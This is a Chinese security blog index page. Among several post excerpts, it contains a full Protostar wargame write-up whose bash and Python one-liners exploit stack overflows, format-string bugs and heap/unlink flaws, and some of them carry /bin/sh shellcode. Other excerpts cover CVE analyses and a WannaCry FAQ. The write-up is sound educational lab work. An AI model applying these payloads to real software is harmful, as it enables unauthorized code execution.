<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>WeaponX&#39;s Blog</title>
  <meta name="author" content="WeaponX">
  
  <meta name="description" content="Vulnerability|Security|Binary">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="WeaponX&#39;s Blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/atom.xml" title="WeaponX&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  

  <script>
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
    })();
  </script>
  <script>
  (function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
   })();
   </script>
</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">WeaponX&#39;s Blog</a></h1>
  <h2><a href="/">Binary</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-06-07T10:03:55.000Z"><a href="/2017/06/07/NETBIOS主机名编码算法/">2017-06-07</a></time>
      
      
  
    <h1 class="title"><a href="/2017/06/07/NETBIOS主机名编码算法/">NETBIOS主机名编码算法</a></h1>
  

    </header>
    <div class="entry">
      
        <p>最近在看SMB协议，在自己构造数据包的时候发现了一个问题。</p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/2017/06/07/NETBIOS主机名编码算法/#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-05-24T01:31:40.000Z"><a href="/2017/05/23/CVE-2010-2553分析-漏洞战争/">2017-05-23</a></time>
      
      
  
    <h1 class="title"><a href="/2017/05/23/CVE-2010-2553分析-漏洞战争/">CVE-2010-2553分析[漏洞战争]</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CVE 2010-2553漏洞，也称为MicrosoftWindows Cinepak 编码解码器解压缩漏洞，影响的操作系统版本有：Microsoft Windows XP SP2和SP3，WindowsVista SP1和SP2，以及Windows 7。</p>
<p>漏洞原因在于Cinepak 编码解码器对媒体文件解压缩时代码控制不恰当，可导致远程代码执行。如果用户打开特制的媒体文件，此漏洞可能允许执行代码。如果用户使用管理用户权限登录，成功利用此漏洞的攻击者便可完全控制受影响的系统。</p>
<p>漏洞利用wmplay.exe，而wmplay.exe这个播放器在国内很少有人使用，如果被攻击者使用了第三方的视频播放软件，很难攻击成功，这可能也是这一漏洞不被分析重视的一大原因。</p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/2017/05/23/CVE-2010-2553分析-漏洞战争/#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-05-19T09:17:24.000Z"><a href="/2017/05/19/ISCC中pwn200-shell无法启动原因详解/">2017-05-19</a></time>
      
      
  
    <h1 class="title"><a href="/2017/05/19/ISCC中pwn200-shell无法启动原因详解/">ISCC中pwn200 shell无法启动原因详解</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>一朋友问到在pwn中，gdb调试看到了<code>systemm(&quot;/bin/sh&quot;)</code>了，但是shell确无法启动。于是我详细看了一下这个题目，发现自己的exploit绝大多数情况下也无法启动shell。</p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/2017/05/19/ISCC中pwn200-shell无法启动原因详解/#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-05-19T08:02:47.000Z"><a href="/2017/05/19/Ubuntu上源码调试glibc/">2017-05-19</a></time>
      
      
  
    <h1 class="title"><a href="/2017/05/19/Ubuntu上源码调试glibc/">Ubuntu上源码调试glibc</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近有个需求，需要源码调试glibc。由于系统的glibc没有调试符号，所以也算费了一番周折。不过ubuntu还是比较人性化的。</p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/2017/05/19/Ubuntu上源码调试glibc/#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-05-16T06:48:51.000Z"><a href="/2017/05/16/勒索软件WannaCry的FAQ/">2017-05-16</a></time>
      
      
  
    <h1 class="title"><a href="/2017/05/16/勒索软件WannaCry的FAQ/">勒索软件WannaCry的FAQ</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="什么是勒索软件"><a href="#什么是勒索软件" class="headerlink" title="什么是勒索软件"></a>什么是勒索软件</h2><p>勒索软件就是利用加密手段，加密感染机器上的特定文件。要求用户支付赎金（通常为比特币）后，黑客会解密被加密的文件。</p>
<h2 id="什么是比特币"><a href="#什么是比特币" class="headerlink" title="什么是比特币"></a>什么是比特币</h2><p>比特币利用区块链(Block chain)技术，通过计算产生，总量趋于一个固定值，可以兑换成一些现实货币。</p>
<h2 id="WannaCry勒索软件为什么会这么火"><a href="#WannaCry勒索软件为什么会这么火" class="headerlink" title="WannaCry勒索软件为什么会这么火"></a>WannaCry勒索软件为什么会这么火</h2><p>勒索软件流程时间比较长，但是WannaCry作为勒索软件中的一员，利用了NSA方程式组织的SMB漏洞利用工具EternalBlue来远程执行任意代码，这个漏洞在2017年3月微软补丁日被修复，补丁编号MS17-010。因为修复时间比较近，而且由于某些原因，国内打补丁的习惯并没有养成。</p>
<h2 id="WannaCry是怎么加密的"><a href="#WannaCry是怎么加密的" class="headerlink" title="WannaCry是怎么加密的"></a>WannaCry是怎么加密的</h2><p>简要的说WannaCry是通过AES和RSA共同加密。其中AES是对称加密（加密密钥和解密密钥是同一个），RSA是非对称加密（加密密钥和解密密钥不同，公钥用来加密、私钥用来解密，反之也可）。<br>作者有个公私钥对A1/A2，把公钥A1内置在程序中。当程序运行时再生成一对公私钥对B1/B2，用公钥A1加密私钥B2。WannaCry对每个文件生成一个随机AES密钥，然后用这个密钥来加密对应的文件。随后，用生成的RSA公钥B1来加密这个AES密钥。</p>
<h2 id="WannaCry支付赎金后黑客是否可以解开被加密的文件"><a href="#WannaCry支付赎金后黑客是否可以解开被加密的文件" class="headerlink" title="WannaCry支付赎金后黑客是否可以解开被加密的文件"></a>WannaCry支付赎金后黑客是否可以解开被加密的文件</h2><p>可以。解密流程是这样的，支付赎金后将Transaction id和被加密的RSA密钥B2的发给黑客。黑客验证通过即可用RSA私钥解开被加密的密钥B2，然后用户就可以用被解密密钥B2来解密AES密钥，用被解密的AES密钥来恢复被加密的文件。</p>
<h2 id="网上说的各种数据恢复工具可以恢复数据吗"><a href="#网上说的各种数据恢复工具可以恢复数据吗" class="headerlink" title="网上说的各种数据恢复工具可以恢复数据吗"></a>网上说的各种数据恢复工具可以恢复数据吗</h2><p>网上的一些号称解密程序基本都是基于删除的文件恢复，删除文件恢复的原理是当系统删除文件的时候并不会真正的删除文件，而是标记这块区域没有占用，只要这块内容没有被覆盖则很有可能恢复。但是WannaCry是一边删除一边写文件，而且会向源文件写入随机内容。所以基于误删恢复的基本不太可能。</p>
<h2 id="不交赎金是否有办法恢复加密后的文件"><a href="#不交赎金是否有办法恢复加密后的文件" class="headerlink" title="不交赎金是否有办法恢复加密后的文件"></a>不交赎金是否有办法恢复加密后的文件</h2><p>基本不可能。</p>
<h2 id="更新微软补丁能否防止勒索软件攻击"><a href="#更新微软补丁能否防止勒索软件攻击" class="headerlink" title="更新微软补丁能否防止勒索软件攻击"></a>更新微软补丁能否防止勒索软件攻击</h2><p>微软补丁只是防止勒索软件利用远程代码执行的漏洞进行传播，如果在电脑上运行了勒索软件还是会被勒索。</p>
<h2 id="以后如何防止类似的事情发生"><a href="#以后如何防止类似的事情发生" class="headerlink" title="以后如何防止类似的事情发生"></a>以后如何防止类似的事情发生</h2><p>安装一线厂商的杀毒软件，如卡巴斯基，BitDefender等。</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-05-08T08:37:33.000Z"><a href="/2017/05/08/CVE-2010-3333分析-漏洞战争/">2017-05-08</a></time>
      
      
  
    <h1 class="title"><a href="/2017/05/08/CVE-2010-3333分析-漏洞战争/">CVE-2010-3333分析[漏洞战争]</a></h1>
  

    </header>
    <div class="entry">
      
        <p>CVE-2010-3333漏洞是一个栈溢出漏洞，该漏洞是由于Microsoft word在处理RTF数据的对数据解析处理错误，可被利用破坏内存，导致任意代码执行。</p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/2017/05/08/CVE-2010-3333分析-漏洞战争/#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-04-13T06:25:28.000Z"><a href="/2017/04/13/评论系统切换至网易云跟帖/">2017-04-13</a></time>
      
      
  
    <h1 class="title"><a href="/2017/04/13/评论系统切换至网易云跟帖/">评论系统切换至网易云跟帖</a></h1>
  

    </header>
    <div class="entry">
      
        <p>用了一阵多说，disqus。多说的问题在于经常大姨妈，而且即将关站。disqus被墙，对国内用户访问不友好。</p>
<p>对比了下友言和网易云跟帖，友言还需要备案号。当然最后选择的网易云跟帖。</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-04-13T02:05:28.000Z"><a href="/2017/04/12/python如何调用-del-及全局变量如何存储/">2017-04-12</a></time>
      
      
  
    <h1 class="title"><a href="/2017/04/12/python如何调用-del-及全局变量如何存储/">python如何调用__del__及全局变量如何存储</a></h1>
  

    </header>
    <div class="entry">
      
        <p>在处理一个bug的时候发现程序一直报错，<code>Exception exceptions.NameError: &quot;global name &#39;TEST&#39; is not defined&quot;</code>。仔细审查了下源码，发现这个<code>TEST</code>变量是个全局变量，已经定义了。只不过在类的析构函数<code>__del__()</code>中解引用了<code>del TEST</code>。</p>
<p>这引出了两个问题：</p>
<ol>
<li>一个类的对象，什么时候调用析构函数？</li>
<li>为什么一个对象把<code>TEST</code>解引用了其他对象也无法访问？</li>
</ol>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/2017/04/12/python如何调用-del-及全局变量如何存储/#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-04-11T06:48:37.000Z"><a href="/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/">2017-04-11</a></time>
      
      
  
    <h1 class="title"><a href="/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/">Exploit-Exercises Protostar writeup PART I</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x44*'a'"</span> | ./stack0</div><div class="line">you have changed the <span class="string">'modified'</span> variable</div></pre></td></tr></table></figure>
<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x64\x63\x62\x61'"</span> | xargs ./stack1</div><div class="line">you have correctly got the variable to the right value</div></pre></td></tr></table></figure>
<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + <span class="string">'\x0a\x0d\x0a\x0d'</span></div><div class="line">os.putenv(<span class="string">"GREENIE"</span>, payload)</div><div class="line">os.system(<span class="string">"./stack2"</span>)</div></pre></td></tr></table></figure>
<h2 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack3 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 08048424    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x24\x84\x04\x08'"</span> | ./stack3</div><div class="line">calling <span class="keyword">function</span> pointer, jumping to 0x08048424</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
<h2 id="stack-4"><a href="#stack-4" class="headerlink" title="stack 4"></a>stack 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack4 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 080483f4    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 76*'a'+'\xf4\x83\x04\x08'"</span>|./stack4</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
<h2 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : disabled</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
<p>系统没开ASLR。让程序崩溃，调试core dump获得stack address。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print 0x4c*'a'+'\x10\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack5</div></pre></td></tr></table></figure></p>
<h2 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h2><p>return addr =&gt; addr(ret) =&gt; stack addr</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048508</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x08\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
<h2 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048553</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x53\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
<h2 id="format0"><a href="#format0" class="headerlink" title="format0"></a>format0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 0x40*'a'+'\xef\xbe\xad\xde'" | xargs ./format0</span></div><div class="line">you have hit the target correctly :)</div></pre></td></tr></table></figure>
<h2 id="format1"><a href="#format1" class="headerlink" title="format1"></a>format1</h2><p><code>%128$n</code>代表第128个参数，argv会放在栈上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\x38\x96\x04\x08\x08\x04aaa%128\$n'" | xargs ./format1                                                                       aaayou have modified the target :)</span></div></pre></td></tr></table></figure>
<h2 id="format2"><a href="#format2" class="headerlink" title="format2"></a>format2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8048477 &lt;vuln+35&gt;: call   0x804835c &lt;fgets@plt&gt;</div><div class="line">   0x804847c &lt;vuln+40&gt;: lea    eax,[ebp-0x208]</div><div class="line">   0x8048482 &lt;vuln+46&gt;: mov    DWORD PTR [esp],eax</div><div class="line">=&gt; 0x8048485 &lt;vuln+49&gt;: call   0x804837c &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">   0x804848a &lt;vuln+54&gt;: mov    eax,ds:0x80496e4</div><div class="line">   0x804848f &lt;vuln+59&gt;: cmp    eax,0x40</div><div class="line">   0x8048492 &lt;vuln+62&gt;: jne    0x80484a2 &lt;vuln+78&gt;</div><div class="line">   0x8048494 &lt;vuln+64&gt;: mov    DWORD PTR [esp],0x8048590</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd440 --&gt; 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">0004| 0xffffd444 --&gt; 0x200</div><div class="line">0008| 0xffffd448 --&gt; 0xf7<span class="built_in">fc</span>2c20 --&gt; 0xfbad2288</div><div class="line">0012| 0xffffd44c --&gt; 0xf7fec308 (&lt;_dl_check_map_versions+632&gt;:  mov    edi,eax)</div><div class="line">0016| 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div></pre></td></tr></table></figure>
<p>exploit:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\xe4\x96\x04\x08%4\$060x%4\$n'" | ./format2</span></div><div class="line">.0000000000000000000000000000000000000000000000000000080496e4</div><div class="line">you have modified the target :)</div></pre></td></tr></table></figure>
<h2 id="format3"><a href="#format3" class="headerlink" title="format3"></a>format3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\xf4\x96\x04\x08%12\$016930112x%12\$n'"</span> | ./format3</div></pre></td></tr></table></figure>
<p>看了我的方法还是有点弱- -，基本就是一字节写比较好的方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">'print "\xf4\x96\x04\x08"+"\xf5\x96\x04\x08"+"\xf6\x96\x04\x08"+"\xf7\x96\x04\x08"+"%52x%12$n%13$n%14$n%15$n"'</span> | ./format3</div><div class="line">target is 44444444 :(</div></pre></td></tr></table></figure>
<h2 id="format4"><a href="#format4" class="headerlink" title="format4"></a>format4</h2><p>写exit的GOT表中的数据,<code>GOT[&quot;exit&quot;]=0x08049724</code>，单字节写入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08'+'%0164x%4\$n%0208x%5\$n%0128x%6\$n%260x%7\$n'"</span> | ./format4</div></pre></td></tr></table></figure>
<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>winner = 0x08048464</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 72*'a'+'\x64\x84\x04\x08'" | xargs ./heap0</span></div><div class="line">data is at 0x804a008, fp is at 0x804a050</div><div class="line">level passed</div></pre></td></tr></table></figure>
<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p>GOT[“puts”] = 0x08049774<br>winner = 0x08048494<br>没啥说的，把第二个指针覆盖为puts的got地址，第二次strcpy把winner写入puts的got表中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap1 $(python -c "print 20 * 'a' + '\x74\x97\x04\x08'")  $(python -c "print '\x94\x84\x04\x08'")</span></div><div class="line">and we have a winner @ 1491862467</div></pre></td></tr></table></figure>
<h2 id="heap2"><a href="#heap2" class="headerlink" title="heap2"></a>heap2</h2><p>很明显的UAF，struct auth = 36字节，先创建auth，再free再用strdup分配36字节大小的空间即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[ auth = (nil), service = (nil) ]</div><div class="line">auth aaaaa</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">reset</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div><div class="line">login</div><div class="line">you have logged <span class="keyword">in</span> already!</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div></pre></td></tr></table></figure>
<h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><p>unlink导致任意地址写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap3 $(python -c 'print "A" * 4 + "\x68\x64\x88\x04\x08\xc3"') $(python -c 'print "A" * 32 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 8 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC</span></div><div class="line">that wasn<span class="string">'t too bad now, was it? @ 1491865342</span></div></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2017-04-07T08:40:22.000Z"><a href="/2017/04/07/生成自己的Alphanumeric-Printable-shellcode/">2017-04-07</a></time>
      
      
  
    <h1 class="title"><a href="/2017/04/07/生成自己的Alphanumeric-Printable-shellcode/">生成自己的Alphanumeric/Printable shellcode</a></h1>
  

    </header>
    <div class="entry">
      
        <p>文章已经发表到360播报:<a href="http://bobao.360.cn/learning/detail/3720.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3720.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>






<nav id="pagination">
  
  
    <a href="/page/2/" class="alignright next">下一页</a>
  
  <div class="clearfix"></div>
</nav></div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:weaponx.site">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/安全/">安全</a><small>7</small></li>
  
    <li><a href="/categories/tech/">技术</a><small>21</small></li>
  
    <li><a href="/categories/life/">生活</a><small>3</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">标签</h3>
  <ul class="entry">
  
    <li><a href="/tags/ASLR/">ASLR</a><small>1</small></li>
  
    <li><a href="/tags/Django/">Django</a><small>1</small></li>
  
    <li><a href="/tags/Hexo/">Hexo</a><small>4</small></li>
  
    <li><a href="/tags/Linux/">Linux</a><small>1</small></li>
  
    <li><a href="/tags/UAF/">UAF</a><small>2</small></li>
  
    <li><a href="/tags/pwn/">pwn</a><small>13</small></li>
  
    <li><a href="/tags/python/">python</a><small>2</small></li>
  
    <li><a href="/tags/wargame/">wargame</a><small>3</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>4</small></li>
  
    <li><a href="/tags/安全/">安全</a><small>17</small></li>
  
    <li><a href="/tags/影评/">影评</a><small>1</small></li>
  
    <li><a href="/tags/整形溢出/">整形溢出</a><small>1</small></li>
  
    <li><a href="/tags/漏洞分析/">漏洞分析</a><small>2</small></li>
  
    <li><a href="/tags/调试/">调试</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">友情链接</h3>
  <ul class="entry">
  
    <li><a href="http://www.cnblogs.com/goabout2/" title="goabout2">goabout2</a></li>
  
    <li><a href="http://rootkiter.com/" title="RootKiter">RootKiter</a></li>
  
    <li><a href="http://reverse-tcp.xyz/" title="Urahara">Urahara</a></li>
  
    <li><a href="https://www.leavesongs.com/" title="phith0n牛的离别歌">phith0n</a></li>
  
  </ul>
</div>



  <div class="widget tag">
  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=270 height=86 src="//music.163.com/outchain/player?type=2&id=427542287&auto=0&height=66"></iframe>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2017 WeaponX
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


</body>
</html>
